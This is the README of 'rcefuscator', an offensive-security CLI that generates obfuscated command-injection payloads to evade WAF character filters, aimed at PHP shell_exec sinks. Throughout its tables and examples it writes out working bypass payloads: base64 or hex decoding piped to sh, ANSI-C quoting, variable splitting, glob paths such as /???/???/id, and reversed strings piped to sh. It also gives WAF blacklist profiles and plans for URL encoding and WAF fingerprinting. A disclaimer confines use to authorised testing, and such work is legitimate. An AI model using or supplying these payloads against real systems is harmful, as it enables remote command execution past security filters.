<div align="center">

# ⚔️ rcefuscator

**RCE Payload Generator & WAF Evasion Toolkit**

[![Python](https://img.shields.io/badge/Python-3.8+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Click](https://img.shields.io/badge/Click-8.1-2C3E50?style=for-the-badge&logo=python&logoColor=white)](https://click.palletsprojects.com)
[![Rich](https://img.shields.io/badge/Rich-13.7-FF6B6B?style=for-the-badge&logo=python&logoColor=white)](https://github.com/Textualize/rich)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
[![Tests](https://img.shields.io/badge/Tests-58%20Passing-brightgreen?style=for-the-badge&logo=pytest&logoColor=white)](tests/)
[![Domain](https://img.shields.io/badge/Domain-Offensive%20Security-red?style=for-the-badge&logo=hackthebox&logoColor=white)](DISCLAIMER.md)

---

> **The problem:** WAF rules are getting smarter — but most just block obvious characters. Raw `id`, `whoami`, or `cat /etc/passwd` get blocked. But what about `$'\x69\x64'`? Or `/???/???/id`? Or `echo 'di' | rev | sh`?
>
> **rcefuscator generates all viable bypass variants instantly. Pick the one your WAF doesn't see.**

</div>

---

> ⚠️ **[READ DISCLAIMER](DISCLAIMER.md)** — This tool is strictly for **authorized penetration testing, CTF challenges, and educational research**. Using it against systems you do not own or have explicit written permission to test is **illegal**.

---

## 🎬 What It Does

rcefuscator takes a user-supplied OS command (e.g. `id`, `whoami`, `cat /etc/passwd`) and outputs **multiple obfuscated payload variants** designed to bypass naïve WAF filters that block common injection characters (`;`, `|`, `&`, `$`, backticks, `(`, `)`).

It targets the `shell_exec($_GET['cmd'])` PHP sink context but applies broadly to **any command injection scenario**.

---

## ⚡ Quick Start

```bash
# Clone and install
git clone https://github.com/ak4hit/rcefuscator.git
cd rcefuscator
pipx install .

# Generate all payloads for 'id' under the moderate WAF profile
rcefuscator --cmd "id"

# Use the strict profile (blocks more chars)
rcefuscator --cmd "id" --profile strict

# Output as JSON
rcefuscator --cmd "whoami" --json

# Save to file
rcefuscator --cmd "id" --output payloads.txt

# List all available techniques
rcefuscator --list-techniques
```

---

## 🤖 How It Works — 8 Techniques, Instant Output

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         rcefuscator PAYLOAD ENGINE                         │
├─────────────────┬───────────────────────────────────────────────────────────┤
│   INPUT         │  OS command: id / whoami / cat /etc/passwd               │
├─────────────────┴───────────────────────────────────────────────────────────┤
│                                                                             │
│   ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  │
│   │  Base64      │  │  Hex Encode  │  │  ANSI-C      │  │  Var Split   │  │
│   │  Encoding    │  │  (printf+xxd)│  │  Quoting     │  │              │  │
│   │              │  │              │  │              │  │              │  │
│   │ echo 'aWQ='  │  │ printf       │  │ $'\x69\x64'  │  │ _a=i;_b=d;  │  │
│   │ |base64 -d   │  │ '\x69\x64'   │  │              │  │ $_a$_b       │  │
│   │ |sh          │  │ |xxd -p -r   │  │ No pipes.    │  │              │  │
│   │              │  │ |sh          │  │ Cleanest.    │  │              │  │
│   │ Uses: |      │  │ Uses: |      │  │ Uses: $, '   │  │ Uses: $, ;  │  │
│   └──────────────┘  └──────────────┘  └──────────────┘  └──────────────┘  │
│                                                                             │
│   ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  │
│   │  Wildcard /  │  │  Reverse     │  │  Case        │  │  Command     │  │
│   │  Glob Expand │  │  String      │  │  Manipulation│  │  Substitution│  │
│   │              │  │              │  │              │  │              │  │
│   │ /???/???/id  │  │ echo 'di'    │  │ echo 'ID'    │  │ $(printf     │  │
│   │              │  │ |rev|sh      │  │ |tr 'A-Z'    │  │ '\x69\x64') │  │
│   │              │  │              │  │ 'a-z'|sh     │  │              │  │
│   │ Uses: NONE   │  │ Uses: |      │  │ Uses: |      │  │ Uses: $,(,) │  │
│   └──────────────┘  └──────────────┘  └──────────────┘  └──────────────┘  │
│                                                                             │
├─────────────────┬───────────────────────────────────────────────────────────┤
│   BLACKLIST     │  Auto-skip techniques whose chars are blocked by WAF     │
│   VALIDATOR     │  Green panel = clean  ·  Red panel = flagged             │
├─────────────────┴───────────────────────────────────────────────────────────┤
│   OUTPUT        │  Rich terminal · JSON · Plain-text file · Clipboard      │
└─────────────────────────────────────────────────────────────────────────────┘
```

Each technique declares which special characters **it uses itself**. rcefuscator auto-skips any technique whose required chars are in your active WAF blacklist — so you only see payloads that can actually survive the filter.

---

## 🧪 Techniques — Full Table

| # | ID | Technique | Example Output (`id`) | Uses Chars | Shell |
|---|----|-----------|-----------------------|------------|-------|
| 1 | `base64` | Base64 Encoding | `echo 'aWQ='\|base64 -d\|sh` | `\|` | bash/sh |
| 2 | `hex_printf` | Hex Encoding (printf + xxd) | `printf '\x69\x64'\|xxd -p -r\|sh` | `\|` | bash/sh |
| 3 | `ansi_c` | ANSI-C Quoting | `$'\x69\x64'` | `$`, `'` | bash |
| 4 | `var_split` | Variable Splitting | `_a=i;_b=d;$_a$_b` | `$`, `;` | bash/sh |
| 5 | `wildcard` | Wildcard / Glob Expansion | `/???/???/id` | **none** | bash/sh |
| 6 | `reverse` | Reverse String | `echo 'di'\|rev\|sh` | `\|` | bash/sh |
| 7 | `case_mangle` | Case Manipulation | `echo 'ID'\|tr 'A-Z' 'a-z'\|sh` | `\|` | bash/sh |
| 8 | `cmd_sub` | Command Substitution `$(…)` | `$(printf '\x69\x64')` | `$`, `(`, `)` | bash |

---

## 🛡️ WAF Profiles

| Profile | Blocked Characters | Use When |
|---------|-------------------|----------|
| `moderate` | `; \| & \`` | Standard WAF (default) |
| `strict` | `; \| & $ \` ( ) < > space` | Hardened input filters |
| `paranoid` | `; \| & $ \` ( ) < > space ' " \` | Maximum restriction |
| `custom` | Defined by `--blacklist` flag | You know exactly what's blocked |

```bash
# Use a preset profile
rcefuscator --cmd "id" --profile strict

# Or supply your own blacklist
rcefuscator --cmd "id" --blacklist "; | & \`"
```

Under the **strict** profile, only `wildcard` and sometimes `ansi_c` survive. Under **moderate**, you get 3–5 clean payloads. Under no blacklist, all 8 are generated.

---

## 💻 All CLI Flags

```bash
rcefuscator [OPTIONS]

Options:
  -c, --cmd TEXT          OS command to obfuscate (e.g. 'id')
  -p, --profile TEXT      WAF profile: moderate | strict | paranoid  [default: moderate]
  -b, --blacklist TEXT    Custom blacklist chars (overrides --profile)
  -t, --technique TEXT    Run a single technique by ID
  -l, --list-techniques   List all available techniques and exit
  -j, --json              Print output as JSON
  -o, --output TEXT       Save payloads to a plain-text file
      --copy              Copy the first clean payload to clipboard
      --show-skipped      Show skipped techniques in the output
      --version           Show version and exit
  -h, --help              Show help and exit
```

### Examples

```bash
# All payloads for 'id', moderate WAF
rcefuscator --cmd "id"

# Only the ANSI-C quoting technique
rcefuscator --cmd "id" --technique ansi_c

# Strict WAF, show what got skipped and why
rcefuscator --cmd "whoami" --profile strict --show-skipped

# Export to JSON for automation / Burp paste
rcefuscator --cmd "id" --json

# Save clean payloads to file
rcefuscator --cmd "id" --profile strict --output results.txt

# Copy first clean payload to clipboard
rcefuscator --cmd "id" --copy
```

---

## 📁 Project Structure

```
rcefuscator/
├── rcefuscator/
│   ├── __init__.py
│   ├── core/
│   │   ├── encoder.py          # All 8 encoding/obfuscation functions
│   │   ├── techniques.py       # Technique registry, WAF profiles, run engine
│   │   └── validator.py        # Blacklist checker — check_payload()
│   ├── cli/
│   │   └── main.py             # Click-based CLI entrypoint
│   └── output/
│       ├── formatter.py        # Rich terminal output (green/red panels)
│       └── exporter.py         # JSON + plain-text file export
├── tests/
│   ├── test_encoder.py         # 34 unit tests for all 8 techniques + registry
│   ├── test_validator.py       # 5 tests for blacklist validator
│   ├── test_cli.py             # 19 integration tests for full CLI
│   └── functional_test.sh      # Bash script for Docker live validation
├── examples/
│   └── sample_outputs.txt      # Pre-generated outputs for id & whoami
├── requirements.txt
├── setup.py
├── DISCLAIMER.md
└── README.md
```

---

## 🔧 Install

```bash
git clone https://github.com/ak4hit/rcefuscator.git
cd rcefuscator
pipx install .
```

### Linux Clipboard Support (optional — for `--copy` flag)

```bash
sudo apt install xclip     # Debian / Ubuntu / Kali
sudo pacman -S xclip       # Arch
sudo dnf install xclip     # Fedora
```

### Run Tests

```bash
pip install pytest
python -m pytest tests/ -v
# Expected: 58 passed
```

---

## 🐳 Functional Validation (Docker)

To verify payloads actually execute in a real bash environment:

```bash
docker run --rm -it -v "$(pwd)":/app ubuntu:22.04 bash /app/tests/functional_test.sh
```

The script runs all 8 payload variants against a live bash shell and confirms each produces `uid=` in the output.

> ⚠️ **Perform this step only on systems you own or have written permission to test.**

---

## 📊 JSON Output Format

```json
{
  "command": "id",
  "waf_profile": "moderate",
  "generated_at": "2026-05-06T17:32:31.990119+00:00",
  "total": 3,
  "clean_count": 3,
  "payloads": [
    {
      "technique": "ansi_c",
      "name": "ANSI-C Quoting ($'\\x..')",
      "payload": "$'\\x69\\x64'",
      "clean": true,
      "uses_chars": ["$", "'"],
      "shell": "bash",
      "description": "Converts chars to \\xHH inside $'...' — no pipes, cleanest technique"
    },
    {
      "technique": "wildcard",
      "name": "Wildcard / Glob Expansion",
      "payload": "/???/???/id",
      "clean": true,
      "uses_chars": [],
      "shell": "bash/sh",
      "description": "Replaces binary path components with ??? glob patterns — zero special chars"
    }
  ]
}
```

---

## 🔮 Roadmap (v2.0)

| Feature | Description |
|---------|-------------|
| `--url-encode` | Auto URL-encode final payload for direct paste into GET params |
| `--space-handler` | Auto-replace spaces with `${IFS}` in multi-word commands |
| `--verify` | Spin up local bash subprocess, run each payload, auto-confirm result |
| `--interactive` | REPL loop — type commands and get live payload generation |
| Burp Suite export | One payload per line for Intruder paste |
| WAF fingerprint mode | Probe a URL with test payloads, auto-detect blocked chars |
| Windows CMD support | `cmd.exe` equivalents for SSJI contexts |

---

## 🤝 Contributing

Pull requests welcome.

1. Fork the repo
2. Create a branch: `git checkout -b feat/your-feature`
3. Commit with conventional commits: `feat:`, `fix:`, `test:`
4. Open a PR against `main`

---

## ⚖️ License

[MIT](LICENSE) — Copyright (c) 2026 ak4hit

---

<div align="center">

**Built by [ak4hit](https://github.com/ak4hit) · Educational Use Only**

*rcefuscator — Because WAFs are filters, not walls.*

</div>
